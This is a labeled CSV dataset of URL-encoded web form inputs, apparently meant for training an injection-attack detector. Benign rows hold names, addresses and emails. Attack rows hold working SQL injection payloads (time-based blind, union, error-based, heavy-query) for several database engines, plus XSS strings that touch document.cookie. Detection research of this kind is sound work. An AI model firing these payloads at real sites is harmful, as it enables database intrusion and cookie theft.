payload,payload_len,alpha,non_alpha,attack_feature,label
c/%20plza.%2018%2C%206-e,16,100.0,0.0,0.0,0
qu.8ncen3rio,12,100.0,0.0,0.0,0
-8053%22%20where%205458%3D5458%20or%209323%3D9323%23,36,86.11111111111111,13.88888888888889,60000.0,1
1%27%2B%28select%20%27ymgm%27%20where%208204%3D8204%20and%20sleep%285%29%23,47,80.85106382978722,19.148936170212767,60000.0,1
mediavilla%20buera,16,100.0,0.0,0.0,0
-5417%20or%20elt%281032%3D1032%2C3623%29,28,82.14285714285714,17.857142857142858,30000.0,1
-1171%27%20union%20all%20select%203958%2C3958%2C3958%2C3958%2C3958--,50,84.0,16.0,60000.0,1
alfi,4,100.0,0.0,0.0,0
1287,4,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27oxdh%27%20where%206967%3D6967%20and%20sleep%285%29%23,48,79.16666666666666,20.833333333333336,60000.0,1
blasco%20rossetti,15,100.0,0.0,0.0,0
1%27%29%29%29%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%28%27bwka%27%3D%27bwka,119,78.99159663865547,21.008403361344538,90000.0,1
40a5e,5,100.0,0.0,0.0,0
gwohsing,8,100.0,0.0,0.0,0
1%29%29%20as%20ojjk%20where%203687%3D3687%20and%20%284833%3D9218%29%2A9218--,50,82.0,18.0,60000.0,1
leiding%40ubuybetter.cat,22,100.0,0.0,0.0,0
-4406%25%27%20union%20all%20select%209599%2C9599%2C9599%2C9599%23,45,84.44444444444444,15.555555555555555,60000.0,1
34306,5,100.0,0.0,0.0,0
1%22%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%282385%29%2C0%29%2C500000000%29%2Cnull%29--,72,83.33333333333334,16.666666666666657,19.999999999999986,1
yasna,5,100.0,0.0,0.0,0
1%25%22%29%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%28%28%22%25%22%3D%22,49,61.224489795918366,38.775510204081634,30000.0,1
40146763x,9,100.0,0.0,0.0,0
c0l0o4a,7,100.0,0.0,0.0,0
-5859%29%20as%20ernq%20where%208394%3D8394%20union%20all%20select%208394%2C8394%2C8394--,64,89.0625,10.9375,90000.0,1
1%29%20where%208375%3D8375%3Bselect%20%2A%20from%20generate_series%286468%2C6468%2Ccase%20when%20%286468%3D7999%29%20then%201%20else%200%20end%29%20limit%201--,109,87.1559633027523,12.844036697247708,60000.0,1
1%27%29%29%20as%20vuzt%20where%204971%3D4971%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,125,86.4,13.600000000000001,60000.0,1
1%27%7C%7C%28select%20%27ussi%27%20where%208958%3D8958%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%29%7C%7C%27,80,78.75,21.25,30000.0,1
benalup-casas%20viejas,20,100.0,0.0,0.0,0
sherm,5,100.0,0.0,0.0,0
-7793%22%29%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%28%22lias%22%3D%22lias,49,67.3469387755102,32.6530612244898,60000.0,1
40139732v,9,100.0,0.0,0.0,0
63269334z,9,100.0,0.0,0.0,0
5a4a84e8a,9,100.0,0.0,0.0,0
soriguera,9,100.0,0.0,0.0,0
l680jis45,9,100.0,0.0,0.0,0
bobadilla%20del%20campo,19,100.0,0.0,0.0,0
lena,4,100.0,0.0,0.0,0
envelar,7,100.0,0.0,0.0,0
salce%40masqueclases.tg,21,100.0,0.0,0.0,0
alek,4,100.0,0.0,0.0,0
1%22%29%20and%20elt%281889%3D7397%2C7397%29%20and%20%28%22kuau%22%3D%22kuau,45,75.55555555555556,24.444444444444443,60000.0,1
a0_idia,7,100.0,0.0,0.0,0
donadieu%20zanotti,16,100.0,0.0,0.0,0
46369,5,100.0,0.0,0.0,0
5.92934E+14,16,68.75,31.25,45.45454545454545,0
duo_davalos%40designworld.cz,26,100.0,0.0,0.0,0
17470,5,100.0,0.0,0.0,0
empel6tarse,11,100.0,0.0,0.0,0
sobrestante,11,100.0,0.0,0.0,0
codos,5,100.0,0.0,0.0,0
ab_ogadora,10,100.0,0.0,0.0,0
1%27%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%27tvcm%27%3D%27tvcm,161,71.42857142857143,28.57142857142857,60000.0,1
dehr,4,100.0,0.0,0.0,0
1%25%27%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,44,77.27272727272727,22.727272727272727,60000.0,1
castelln%20de%20la%20plana/castell%20de%20la%20plana,40,100.0,0.0,0.0,0
1%27%2B%28select%20inyd%20where%201668%3D1668%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%29%2B%27,123,81.30081300813008,18.69918699186992,60000.0,1
cami%20capellana%2034%2013%3Fe,22,100.0,0.0,0.0,0
omura5,6,100.0,0.0,0.0,0
95726092t,9,100.0,0.0,0.0,0
perr%40pasajesaereosbaratos.pm,28,100.0,0.0,0.0,0
quan%40arroyo-molinos.ee,22,100.0,0.0,0.0,0
kenji,5,100.0,0.0,0.0,0
c/%20escultor%20julio%20gonzalez%2088%2C,30,100.0,0.0,0.0,0
tuneu,5,100.0,0.0,0.0,0
1%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end,32,84.375,15.625,18.51851851851852,1
1%27%2B%28select%20immd%20where%207499%3D7499%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,89,86.51685393258427,13.48314606741573,90000.0,1
-2254%27%29%20as%20dyrv%20where%209079%3D9079%20union%20all%20select%209079%2C9079%2C9079%2C9079%2C9079%2C9079%2C9079%2C9079%23,89,86.51685393258427,13.48314606741573,90000.0,1
1%27%29%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%28%27xcxr%27%20like%20%27xcxr,70,80.0,20.0,60000.0,1
royo%2C%20el,8,100.0,0.0,0.0,0
stimson_holbrook%40cementosanfranq.ly,35,100.0,0.0,0.0,0
1%22%20or%208514%3Dbenchmark%285000000%2Cmd5%280x544d5a4c%29%29%23,46,82.6086956521739,17.391304347826086,30000.0,1
-7209%27%29%29%29%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr,215,47.44186046511628,20.930232558139537,30000.0,1
1%27%29%29%29%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%28%28%28%27dbsm%27%3D%27dbsm,99,67.67676767676768,32.323232323232325,60000.0,1
28530,5,100.0,0.0,0.0,0
-1%3Cstyle%3E.crosssitescripting%7Bbackground-image%3Aurl%28%22javascript%3Adocument.cookie%3Dtrue%22%29%3B%7D%3C/style%3E%3Ca%20class%3Dcrosssitescripting%3E%3C/a%3E,126,80.15873015873017,18.253968253968253,90000.0,1
1%27%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29,104,87.5,12.5,60000.0,1
enparantza%20concordia%2047%2C,24,100.0,0.0,0.0,0
toi,3,100.0,0.0,0.0,0
barot%20holm,10,100.0,0.0,0.0,0
rehenchida,10,100.0,0.0,0.0,0
-3326%27%2B%28select%20xitp%20where%207621%3D7621%20union%20all%20select%207621%2C7621%2C7621%2C7621%2C7621%2C7621%2C7621%2C7621%2C7621%2C7621%23,103,85.43689320388349,14.563106796116504,90000.0,1
pullman-mcclintock%40surcosur.st,30,100.0,0.0,0.0,0
co1coja,7,100.0,0.0,0.0,0
lerumeur%40phd-photodecor.sj,26,100.0,0.0,0.0,0
cami%20son%20colam%20153%2C%203-c,23,100.0,0.0,0.0,0
1%25%22%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%22%25%22%3D%22,57,73.68421052631578,26.31578947368421,30000.0,1
pozaldez,8,100.0,0.0,0.0,0
flicking,8,100.0,0.0,0.0,0
28760,5,100.0,0.0,0.0,0
vallabri%20visglerio,18,100.0,0.0,0.0,0
1%29%29%29%20rlike%20sleep%285%29%23,20,70.0,30.0,42.857142857142854,1
arvizu%20tirapu,13,100.0,0.0,0.0,0
78590398l,9,100.0,0.0,0.0,0
bisbe%20gonyalons%20189%2012%3Ff,24,100.0,0.0,0.0,0
1%29%29%20as%20vcvn%20where%202106%3D2106%3Bwaitfor%20delay%20%270%3A0%3A5%27--,51,80.3921568627451,19.607843137254903,60000.0,1
derrick,7,100.0,0.0,0.0,0
xixian,6,100.0,0.0,0.0,0
1221,4,100.0,0.0,0.0,0
33555,5,100.0,0.0,0.0,0
1%27%29%3Bselect%20%28case%20when%20%287217%3D7631%29%20then%207217%20else%207217%2A%28select%207217%20from%20information_schema.character_sets%29%20end%29%23,112,86.60714285714286,13.392857142857142,30000.0,1
1%25%22%20or%207417%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,105,85.71428571428571,14.285714285714285,60000.0,1
1%29%29%20as%20ztcn%20where%201043%3D1043%20and%206305%3D5785--,43,86.04651162790698,13.953488372093023,60000.0,1
6.86861E+14,16,68.75,31.25,45.45454545454545,0
47320,5,100.0,0.0,0.0,0
37329,5,100.0,0.0,0.0,0
1%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%23%20lexm,206,73.30097087378641,26.699029126213592,60000.0,1
6287,4,100.0,0.0,0.0,0
1%27%29%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%27ajkb%27%3D%27ajkb,118,81.35593220338984,18.64406779661017,90000.0,1
1%22%29%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,48,81.25,18.75,30000.0,1
7839,4,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%28%28%22%25%22%3D%22,59,67.79661016949152,32.20338983050847,90000.0,1
esclisiado,10,100.0,0.0,0.0,0
ex1%2Aav2936a,11,100.0,0.0,0.0,0
1%27%2B%28select%20snam%20where%201993%3D1993%3Bcall%20regexp_substring%28repeat%28right%28char%282385%29%2C0%29%2C500000000%29%2Cnull%29--,99,80.8080808080808,19.19191919191919,30000.0,1
%3Ca%20id%3Dxss%20href%3D%22about%3A%3Cscript%3Ealert%28%27xss%27%29%3B%3C/script%3E%22%3E,54,74.07407407407408,25.925925925925924,35.0,1
nikolia,7,100.0,0.0,0.0,0
80047732g,9,100.0,0.0,0.0,0
1%27%2B%28select%20%27gqsk%27%20where%203087%3D3087%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,72,84.72222222222221,15.277777777777779,90000.0,1
almussafes,10,100.0,0.0,0.0,0
credenciales%20incorrectas,24,100.0,0.0,0.0,0
verde,5,100.0,0.0,0.0,0
wilfrid,7,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%208148%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,69,71.01449275362319,28.985507246376812,39000.0,1
6785,4,100.0,0.0,0.0,0
-6802%29%20as%20coyv%20where%205693%3D5693%20or%208571%3D8571--,45,86.66666666666667,13.333333333333334,60000.0,1
-8341%20or%208571%3D8571--,20,80.0,20.0,30000.0,1
cuervo1,7,100.0,0.0,0.0,0
calle%20paloma%20101%2C,17,100.0,0.0,0.0,0
1%22%29%20where%209447%3D9447%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,120,75.0,25.0,30000.0,1
levert,6,100.0,0.0,0.0,0
9.47299E+15,16,68.75,31.25,45.45454545454545,0
-8028%25%27%29%29%29%20or%205042%3D5214,23,69.56521739130434,30.434782608695656,30000.0,1
1%27%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%27mnod%27%3D%27mnod,80,77.5,22.5,69000.0,1
moloney%40imarbella.travel,24,100.0,0.0,0.0,0
-7084%29%20where%202260%3D2260%20or%20elt%281032%3D1032%2C3623%29--,47,80.85106382978722,19.148936170212767,60000.0,1
aloguer,7,100.0,0.0,0.0,0
1%29%20as%20nioj%20where%209703%3D9703%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,111,88.28828828828829,11.711711711711711,60000.0,1
villava/atarrabia,17,100.0,0.0,0.0,0
depravador,10,100.0,0.0,0.0,0
1%27%29%20where%205286%3D5286%3Bselect%20%28case%20when%20%281123%3D9550%29%20then%201123%20else%201123%2A%28select%201123%20from%20information_schema.character_sets%29%20end%29%23,128,87.5,12.5,60000.0,1
1%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29,109,75.22935779816514,24.770642201834864,30000.0,1
braham,6,100.0,0.0,0.0,0
ulc0r81a,8,100.0,0.0,0.0,0
di874i0,7,100.0,0.0,0.0,0
1%22%29%29%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%22ampn%22%20like%20%22ampn,121,84.29752066115702,15.702479338842975,120000.0,1
1%27%2B%28select%20bptu%20where%207356%3D7356%20%28select%20%28case%20when%20%284587%3D4587%29%20then%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%2876%29%7C%7Cchar%2865%29%7C%7Cchar%28102%29%7C%7Cchar%2872%29%20end%29%20from%20%28values%280%29%29%29%29%2B%27,232,75.86206896551724,24.137931034482758,60000.0,1
50163,5,100.0,0.0,0.0,0
42148,5,100.0,0.0,0.0,0
navalmanzano,12,100.0,0.0,0.0,0
1%27%29%20as%20xrap%20where%205523%3D5523%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,73,82.1917808219178,17.80821917808219,60000.0,1
-1%3Cbody%20onload%3D%22document.cookie%3Dtrue%3B%22%3E,39,76.92307692307693,23.076923076923077,60000.0,1
pealara%2C%2087,11,100.0,0.0,0.0,0
ductilidad,10,100.0,0.0,0.0,0
batobrina.falkenstein%40ebs-construcciones.sv,43,100.0,0.0,0.0,0
1%29%29%20as%20somz%20where%201598%3D1598%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,118,87.28813559322035,12.711864406779661,60000.0,1
63171354z,9,100.0,0.0,0.0,0
for26same8te,12,100.0,0.0,0.0,0
-2300%29%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%281,208,59.61538461538461,18.75,60000.0,1
3.58067E+15,16,68.75,31.25,45.45454545454545,0
1%25%22%29%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,105,79.04761904761905,20.95238095238095,26.506024096385538,1
cuevas%20de%20san%20marcos,20,100.0,0.0,0.0,0
1%22%29%3Bselect%20%28case%20when%20%284043%3D5276%29%20then%204043%20else%204043%2A%28select%204043%20from%20information_schema.character_sets%29%20end%29%23,112,86.60714285714286,13.392857142857142,30000.0,1
1%22%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%22qkds%22%20like%20%22qkds,69,82.6086956521739,17.391304347826086,90000.0,1
-2701%22%29%29%20as%20wvht%20where%205401%3D5401%20union%20all%20select%205401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%23,90,85.55555555555556,14.444444444444443,90000.0,1
-7345%25%22%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113,212,56.60377358490566,18.39622641509434,60000.0,1
albacete,8,100.0,0.0,0.0,0
1%27%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29%20and%20%27mepp%27%3D%27mepp,62,77.41935483870968,22.58064516129032,90000.0,1
7.64748E+15,16,68.75,31.25,45.45454545454545,0
tasies%20cirujano,15,100.0,0.0,0.0,0
stadler_munks%40chevrolet-volt.at,31,100.0,0.0,0.0,0
6.1724E+15,16,62.5,37.5,60.0,0
1%29%29%29%3Biif%285257%3D5257%2C1%2C1/0%29,25,76.0,24.0,31.57894736842105,1
40370,5,100.0,0.0,0.0,0
1%27%29%20and%201987%3D3756%23,18,77.77777777777779,22.22222222222222,30000.0,1
-3729%27%29%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28,222,52.702702702702695,18.01801801801802,60000.0,1
1%25%27%29%29%29%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%20and%20%28%28%28%27%25%27%3D%27,251,68.52589641434263,31.47410358565737,129000.0,1
48600,5,100.0,0.0,0.0,0
3411,4,100.0,0.0,0.0,0
santiago%20apostol%2082%2013%3Fh,24,100.0,0.0,0.0,0
b3r3al,6,100.0,0.0,0.0,0
1%20where%204844%3D4844%3Bselect%20case%20when%203252%3D9622%20then%201%20else%20null%20end--,67,92.53731343283582,7.462686567164178,30000.0,1
3146,4,100.0,0.0,0.0,0
l1b6855ca30e,12,100.0,0.0,0.0,0
boget%20brufau,12,100.0,0.0,0.0,0
1%22%20where%207232%3D7232%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29--,207,80.67632850241546,19.32367149758454,60000.0,1
1%27%7C%7C%28select%20%27ymre%27%20where%208681%3D8681%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,122,81.9672131147541,18.0327868852459,60000.0,1
pepe.whitehead%40jaxiaabogadosyeconomistas.nr,43,100.0,0.0,0.0,0
1%27%29%29%29%28select%20%28case%20when%20%284587%3D4587%29%20then%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%2876%29%7C%7Cchar%2865%29%7C%7Cchar%28102%29%7C%7Cchar%2872%29%20end%29%20from%20%28values%280%29%29%29%20and%20%28%28%28%27nets%27%20like%20%27nets,227,74.00881057268722,25.991189427312776,90000.0,1
bossert,7,100.0,0.0,0.0,0
1%27%20where%201230%3D1230%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,156,72.43589743589743,27.564102564102566,60000.0,1
-1%3Cobject%20classid%3D%22clsid%3A...%22%20codebase%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,74,77.02702702702703,22.972972972972975,90000.0,1
63s4r1a1t2,10,100.0,0.0,0.0,0
izzi%20barnils,12,100.0,0.0,0.0,0
1%29%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,101,82.17821782178217,17.82178217821782,60000.0,1
1%25%22%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%22%25%22%3D%22,185,79.45945945945945,20.54054054054054,90000.0,1
4.64693E+15,16,68.75,31.25,45.45454545454545,0
calzada%20rebassa,15,100.0,0.0,0.0,0
robin%40comerciosdeaspe.info,26,100.0,0.0,0.0,0
erhard%40miplat.il,16,100.0,0.0,0.0,0
1%27%2B%28select%20%27ewlk%27%20where%201078%3D1078%20and%202716%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,186,89.24731182795699,10.75268817204301,90000.0,1
1%27%29%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%20and%20%28%27cfzp%27%20like%20%27cfzp,118,80.50847457627118,19.491525423728813,90000.0,1
9a7bl1,6,100.0,0.0,0.0,0
73002359z,9,100.0,0.0,0.0,0
ryszard,7,100.0,0.0,0.0,0
8855,4,100.0,0.0,0.0,0
1%29%29%29%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,98,83.6734693877551,16.3265306122449,30000.0,1
realmente,9,100.0,0.0,0.0,0
3679,4,100.0,0.0,0.0,0
1%25%22%29%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%22%25%22%3D%22,154,68.83116883116884,31.16883116883117,60000.0,1
hoss%40926.yu,11,100.0,0.0,0.0,0
ronna,5,100.0,0.0,0.0,0
gallocanta,10,100.0,0.0,0.0,0
ce7a964na,9,100.0,0.0,0.0,0
1%29%20as%20tgqd%20where%206369%3D6369%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29--,224,73.66071428571429,26.339285714285715,90000.0,1
1%27%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%27eimq%27%3D%27eimq,215,75.81395348837209,24.186046511627907,60000.0,1
9246,5,80.0,20.0,25.0,0
-3930%25%22%29%29%20order%20by%201%23,21,71.42857142857143,28.57142857142857,30000.0,1
pl.%20finlandia%2C%2058%2C%207%3Fd,22,100.0,0.0,0.0,0
1%27%20where%206359%3D6359%20and%20%283020%3D3020%29%2A6703--,41,80.48780487804879,19.51219512195122,60000.0,1
4.27965E+15,16,68.75,31.25,45.45454545454545,0
1%27%7C%7C%28select%20%27kyhs%27%20from%20dual%20where%209491%3D9491%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,129,86.04651162790698,13.953488372093023,90000.0,1
barrera%20medio,13,100.0,0.0,0.0,0
holloway_brandenburg%40bijoubijoudiferente.hu,43,100.0,0.0,0.0,0
crisp%20vivo,10,100.0,0.0,0.0,0
8.69184E+15,16,68.75,31.25,45.45454545454545,0
1%27%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,63,77.77777777777779,22.22222222222222,39000.0,1
1%29%20as%20ozga%20where%204002%3D4002%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29--,68,85.29411764705883,14.705882352941178,90000.0,1
-9848%27%20union%20all%20select%201359%2C1359%2C1359%2C1359%2C1359%2C1359%2C1359%2C1359%2C1359%2C1359--,75,82.66666666666667,17.333333333333336,60000.0,1
6.16251E+15,16,68.75,31.25,45.45454545454545,0
jawdokimov%40manzanilladevillafafila.np,37,100.0,0.0,0.0,0
teo,3,100.0,0.0,0.0,0
3156,4,100.0,0.0,0.0,0
belalczar,9,100.0,0.0,0.0,0
vai%20gala,8,100.0,0.0,0.0,0
4.62651E+15,16,68.75,31.25,45.45454545454545,0
salvador%20perles%2C%2023%2C,20,100.0,0.0,0.0,0
%3Cxml%20id%3D%22x%22%3E%3Ca%3E%3Cb%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C/script%3E%3B%3Cb%3E%3C/a%3E%3C/xml%3E,62,61.29032258064516,38.70967741935484,63.15789473684211,1
siana,5,100.0,0.0,0.0,0
burness,7,100.0,0.0,0.0,0
%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%40gmail.com,89,79.7752808988764,20.224719101123593,120000.0,1
revill5,7,100.0,0.0,0.0,0
8320,4,100.0,0.0,0.0,0
masahiro,8,100.0,0.0,0.0,0
